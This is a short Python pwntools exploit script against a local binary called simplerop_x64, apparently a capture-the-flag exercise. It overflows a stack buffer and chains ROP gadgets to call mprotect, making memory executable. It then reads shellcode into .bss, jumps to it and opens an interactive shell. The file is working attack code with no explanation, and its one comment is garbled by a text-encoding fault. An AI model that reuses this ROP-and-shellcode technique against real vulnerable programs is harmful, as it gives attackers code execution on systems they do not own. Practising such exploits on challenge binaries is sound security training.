from pwn import *
context(arch = 'amd64', os = 'linux')			# ÈÃasm()°´amd64Ä£Ê½»ã±à

sh = process("./simplerop_x64")
pwn = ELF("./simplerop_x64")
read = pwn.symbols["read"]
mprotect = pwn.symbols["mprotect"]
pop_rdi_ret = 0x4016c3
pop_rdx_rsi_ret = 0x4377f9
bss = pwn.bss()
shellcode = asm(shellcraft.amd64.sh())

sh.recv()
payload = 'a'*0x58
payload += p64(pop_rdx_rsi_ret)+p64(7)+p64(0x1000)+p64(pop_rdi_ret)+p64(0x6C1000)+p64(mprotect)
payload += p64(pop_rdx_rsi_ret)+p64(0x100)+p64(bss)+p64(pop_rdi_ret)+p64(0) + p64(read) + p64(bss)
sh.sendline(payload)
sh.sendline(shellcode)
sh.interactive()
